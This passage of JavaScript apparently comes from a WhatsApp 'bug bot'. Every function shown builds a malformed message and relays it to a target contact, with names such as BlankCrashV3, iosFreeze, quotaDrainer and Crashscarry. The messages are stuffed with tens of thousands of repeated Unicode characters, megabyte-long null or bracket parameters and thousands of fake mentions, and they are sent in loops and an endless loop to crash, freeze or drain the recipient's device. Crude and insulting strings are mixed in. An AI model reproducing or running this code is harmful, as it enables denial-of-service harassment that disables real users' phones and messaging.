              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: false,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" + "ꦾ".repeat(15000),
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "{\"title\":\"⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯\",\"sections\":[{\"title\":\"ϟ\",\"rows\":[]}]}",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"️DOCUMENT\",\"flow_id\":\"BY XIAA4YOUUSX\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
              }
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, proto.Message.fromObject(killer), { userJid: jid });
  try {
    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
  } catch (err) {
    console.error("Error in Bug System Ui:", err);
  }
}

async function quotaDrainer(jid) {
    const generateMassiveText = () => {
        return "Izin Sepong Yak" + 
               "᬴᬴᬴".repeat(15000) + 
               "꧔꧈".repeat(15000) + 
               "ꦽ".repeat(20000);
    };

    const massiveText = generateMassiveText();
    
    const eventPayload = {
        eventMessage: {
            isCanceled: false,
            name: massiveText,
            description: massiveText,
            location: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: massiveText
            },
            joinLink: "https://call.whatsapp.com/video/" + Math.random().toString(36).substring(7),
            startTime: Math.floor(Date.now() / 1000),
            endTime: Math.floor(Date.now() / 1000) + 86400,
            extraGuestsAllowed: true,
            contextInfo: {
                mentionedJid: Array.from({ length: 1000 }, () => 
                    `1${Math.floor(1000000000 + Math.random() * 9000000000)}@s.whatsapp.net`
                )
            }
        }
    };

    try {
        await sock.sendMessage(jid, eventPayload, { 
            quoted: null,
            messageId: Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
        });
        
        console.log(`✅ Berhasil Sepong ${jid}`);
    } catch (error) {
        console.log("Failed to send:", error.message);
    }
}

async function StickerSplit(jid) {
  const stickerPayload = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: jid,
            mentionedJid: [
              jid,
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: jid,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, stickerPayload, {});

  if (Math.random() > 0.5) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: jid }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } else {
    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
  }
}

async function SuperHardInvisBisaTembusNasaMark(jid) {
    const mention = false;
    
    const randomJid = () => `1${Math.floor(1000000 + Math.random() * 9000000)}@s.whatsapp.net`;
    
    const thumbBase64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==";

    const messageContent = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                    fileLength: "4119307",
                    seconds: 13,
                    mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                    height: 1280,
                    width: 960,
                    fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                    directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1744620684",
                    jpegThumbnail: thumbBase64,
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "6281991410940@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, randomJid)
                        ]
                    },
                    streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [{
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "SVNX",
                                songId: "INVASION",
                                author: "ONDETGANTENG",
                                title: "Lagu By Me",
                                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                artistAttribution: "https://www.instagram.com/raditx7",
                                countryBlocklist: true,
                                isExplicit: true,
                                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                            }
                        },
                        embeddedAction: null
                    }]
                }
            }
        }
    };

    const waMsg = generateWAMessageFromContent(jid, messageContent, {});
    
    await sock.relayMessage("status@broadcast", waMsg.message, {
        messageId: waMsg.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: jid },
                    content: undefined
                }]
            }]
        }]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: waMsg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }

    console.log(chalk.green(`✅ Bug berhasil dikirim ke ${jid}`));
    await new Promise(resolve => setTimeout(resolve, 5000));
}

async function tititgwgede(jid) {
    const massiveParams = "\u0000".repeat(1045000);
    
    let msg = await generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "😱😱😱😱",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: massiveParams,
                        version: 3
                    },
                    entryPointConversionSource: "galaxy_message",
                },
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    remoteJid: "status@broadcast",
                    mentionedJid: Array.from({ length: 1900 }, () => 
                       `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                    ),
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        }
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterName: "gw ondet lop yu", 
                        newsletterJid: "1@newsletter", 
                        serverMessageId: 999,
                        content: "UPDATE"
                    }
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"), 
    });

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: jid }, content: undefined }
                ]
            }]
        }]
    });

    if (msg) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25,
                    },
                },
            },
        }, {});
    }
}

async function iosFreeze(jid, Ptcp = true) {
   let anjayalokmwkakaakak = "palabapakkau" + "ြ".repeat(25000) + "@1".repeat(60000);
   await sock.relayMessage(jid, {
         messages: {
            Exentedtextmesage: {
               message: {
                  documentMessage: {
                     url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                     mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                     fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                     fileLength: "999999999",
                     pageCount: 0x9184e729fff,
                     mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                     fileName: "NtahMengapa..",
                     fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                     directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                     mediaKeyTimestamp: "1715880173",
                     contactVcard: true
                  },
                  title: "",
                  hasMediaAttachment: true
               },
               body: {
                  text: anjayalokmwkakaakak
               },
               nativeFlowMessage: {},
               contextInfo: {
                  mentionedJid: Array.from({ length: 5 }, () => "0@newsletter"),
          }
         }
      }
   }, { participant: { jid: mentionedJid, jid } }, { messageId: null });
}

async function FreezeFileInvis(jid, Ptcp = true) {
    let anjays = "slayer" + "ြ".repeat(25000) + "@1".repeat(60000);
    await sock.relayMessage(jid, {
            message: {
                ViewOnceMessage: {
                    message: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "bapakkau",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: anjays
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "status@broadcast")
            }
          }
        }
    }, { participant: { jid: mentionedJid, jid } }, { messageId: null });
}

async function BlankCrashV3(jid) {
    const KylX = generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            body: {
              text: "Woy Anjing Kocak" + "ꦾ".repeat(55000)
            },
            footer: {
              text: "Tolol Lu Anjing" 
            },
            header: {
              hasMediaAttachment: false
            },
          }
        }
      }
    }, {});
 await sock.relayMessage(jid, KylX.message, {
messageId: KylX.key.id
});
}

async function Crashscarry(sock, jid) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        jid,
        ...Array.from({ length: 30000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    try {
        for (let i = 0; i < 111; i++) {
            const message = {
                botInvokeMessage: {
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: '666@newsletter',
                            newsletterName: "ꦾ".repeat(60000),
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                            caption: "ꦾ".repeat(90000),
                            inviteExpiration: Date.now() + 0x99999999999abcdef,
                        },
                    },
                },
                nativeFlowMessage: {
                    messageParamsJson: "[{".repeat(10000),
                    buttons: [
                        {
                            name: "mpm",
                            buttonParamsJson: "\u0000".repeat(808808)
                        },
                        {
                            name: "single_select",
                            buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(77777) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
                        },
                        {
                            name: "galaxy_message",
                            buttonParamsJson: JSON.stringify({ status: "1" })
                        },
                        {
                            name: "call_permission_request",
                            buttonParamsJson: "[{".repeat(808808)
                        }
                    ]
                },
                contextInfo: {
                    remoteJid: jid,
                    participant: jid,
                    mentionedJid: mentionedList,
                    stanzaId: sock.generateMessageTag(),
                    businessMessageForwardInfo: {
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    },
                },
            };

            await sock.relayMessage(jid, message, {
                userJid: jid,
            });
        }
    } catch (error) {
        console.log("error:\n" + error);
    }
}

async function Scarry(jid) {
  try {
    // Pastikan target valid
    if (!jid.includes("@")) jid = jid + "@s.whatsapp.net";

    // Siapkan media (gunakan URL gambar valid)
    const media = await prepareWAMessageMedia(
      { image: { url: "https://qu.ax/cmYbR.jpg" } },
      { upload: sock.waUploadToServer }
    );

    // Struktur pesan yang benar untuk interactive message
    const Interactive = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: jid,
              mentionedJid: ["0@s.whatsapp.net"],
              remoteJid: jid,
              stanzaId: "123",
              quotedMessage: {
                conversation: "Hi, this is an interactive message.",
              },
            },
            carouselMessage: {
              messageVersion: 1,
              cards: [
                {
                  header: {
                    hasMediaAttachment: true,
                    media: media.imageMessage,
                  },
                  body: {
                    text: "</> izii Available.",
                  },
                  footer: {
                    text: "how does it feel?",
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Visit",
                          url: "https://example.com",
                        }),
                      },
                    ],
                    messageParamsJson: JSON.stringify({
                      message: "Simple carousel message.",
                    }),
                  },
                },
              ],
            },
          },
        },
      },
    };

    // Kirim pesan ke target
    await sock.relayMessage(jid, Interactive, { messageId: "" });

    console.log("✅ Pesan berhasil dikirim!");
  } catch (error) {
    console.error("❌ Gagal mengirim pesan:", error);
  }
}

async function ScaryDelayInvisible(jid)  {
   const album = await generateWAMessageFromContent(jid, {
      albumMessage: {
         expectedImageCount: 100000000,
         expectedVideoCount: 0,
      }
   }, {});
   
   const imagePayload = {
      imageMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQMkFEuGZ3bLV_dvXmUkZyC0tlj9GEEiS8L5K22Rr9J1w9JbP3j3dsoklN8xBrfq9A-0Yyav-xEoQ80GdbB_jW0bFYv7NndRrMNbCOnFJQ?ccb=9-4&oh=01_Q5Aa1gF3ITej8qDqlRKeHSH7VWOjyHENodEiPoORt3Elspt0Vw&oe=684FF617&_nc_sid=e6ed6c&mms3=true",
         mimetype: "image/jpeg",
         fileSha256: "ArKOYTBAMkcGtAUmIpsHrpUc+h2Em3KwISGMlK4JGcw=",
         fileLength: "46825",
         height: 720,
         width: 720,
         caption: "\u0000".repeat(10000),
         mediaKey: "msJsyD7Snd52+I4zICUo99JmTkF/n5V55Y3WWd8XRIM=",
         fileEncSha256: "+sCpmRVDqzNaA66fi7IIBxXSaBBKGBakhxl2HvbtDlg=",
         directPath: "/o1/v/t24/f2/m232/AQMkFEuGZ3bLV_dvXmUkZyC0tlj9GEEiS8L5K22Rr9J1w9JbP3j3dsoklN8xBrfq9A-0Yyav-xEoQ80GdbB_jW0bFYv7NndRrMNbCOnFJQ?ccb=9-4&oh=01_Q5Aa1gF3ITej8qDqlRKeHSH7VWOjyHENodEiPoORt3Elspt0Vw&oe=684FF617&_nc_sid=e6ed6c",
         mediaKeyTimestamp: "1747370714",
         jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAtAAACAwEBAAAAAAAAAAAAAAAAAwECBAUGAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAAA8yAS1Tx1L541VvY5xBUEhGnM4Ze9IZXXzRBYqgSGvG49EVzS8zKFgADV7Rc9bmx1eb2vMKuG1soAM2AI7AQrjATAVcA//8QAJhAAAgIBAwMEAwEAAAAAAAAAAQIAAxEEEjETIFEFECFhFDJScf/aAAgBAQABPwD3SMuBkxFUj7mMAfctBNOPBgJ7KsAy0xSQ0rIM1JCIB57ascx2HmaUVtaN/ErUdVgOMzX/ABYo7aU3viPo225ENBUDE6a0vk+JfZ1XzD2aPHViKSIKVBNj/qs1Gpa128Z7qW2sDiU3lsApiepakheknaF+ZdThFcCVCsbdxxNPttYBMkDkzVuHst/3sHIlaAkRkr/GdWI4mm0b3sP5lmzR6VgkLE5gxwYygcH2qXdYo8mXhqWwsS13YbjNHcKnCHhp6rdlhX7mWAbFn//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
         scansSidecar: "mT6PclRYEv3tp8a6nKTC0uB7M94FIGDQqPzbxB9yVs1zMc44G0c6OA==",
         scanLengths: [4507, 12015, 9555, 20748],
         midQualityFileSha256: "UPPqsUjGTnZun7b34iuS9S0vjmHC3jm3wvakBMHkIw4=",
         contextInfo: {
            mentionedJid: [
               "13135550002@s.whatsapp.net",
               jid,
               ...Array.from({ length: 2000 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
               )
            ],
         }
      }
   };
   
   const messages = [];
   for (let i = 0; i < 1000; i++) {

      const imgMsg = await generateWAMessageFromContent(jid, imagePayload, {});  
      imgMsg.message.messageContextInfo = {  
         messageAssociation: {  
            associationType: 1,  
            parentMessageKey: album.key  
         }  
      };  
      messages.push(imgMsg);
   }

   await sock.relayMessage(jid, album.message, {
      messageId: album.key.id,
      participant: { jid: jid }
   });
   
   for (const msg of messages) {
      await sock.relayMessage(jid, msg.message, {
         messageId: msg.key.id,
         participant: { jid: jid }
      });
   }
 await sleep(1000);
}     

const ZeppImg = 'https://qu.ax/cmYbR.jpg'; // contoh thumbnail

async function invisibleMultiJid(jid) {
  for (let I = 0; I < 10; I++) {
    await sock.relayMessage(jid, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "P3d0 - Ex3cutor",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "-",
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
              externalAdReply: {
                body: "Xyra - Anonymous",
                mediaType: 1,
                thumbnail: ZeppImg,
                sourceUrl: "https://t.me/Raa4YouuSx",
                sourceType: "whatsapp",
                cdogio: 'cdogio' + Math.floor(Math.random() * 1000000),
                sourceId: String(Math.floor(Math.random() * 900000000) + 100000),
                ctwaClid: 'clid' + Math.floor(Math.random() * 1000000),
                ctaPayload: 'payload' + Math.random().toString(36).substring(2, 10),
                ref: "referencia",
                mediaType: 1,
                clickToWhatsappCall: true,
                adContextPreviewDismissed: false,
                sourceApp: "com.whatsapp",
                automatedGreetingMessageShown: true,
                greetingMessageBody: "x",
                disableNudge: true,
                originalImageUrl: "https://t.me/Raa4YouuSx"
              }
            },
          }
        }
      }
    }, jid ? { participant: { jid: jid } } : {});
  }
}

async function storyOfMyLive(jid, mention = true) {
try {
while (true) {
const msg = await generateWAMessageFromContent(
jid,
{
viewOnceMessage: {
message: {
interactiveResponseMessage: {
nativeFlowResponseMessage: {
version: 3,
name: "call_permission_request",
paramsJson: "\u0000".repeat(1045000)
},
body: {
text: "𝐒𝐜𝐚𝐫𝐫𝐲 𝐃𝐞𝐚𝐭𝐡 𝐍𝐢𝐡 𝐁𝐨𝐬𝐬 > 𝐃𝐞𝐯 𝐑𝐚𝐫𝐚𝐚",
format: "DEFAULT"
}
}
}
}
},
{
isForwarded: false,
ephemeralExpiration: 0,
background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
forwardingScore: 0,
font: Math.floor(Math.random() * 9)
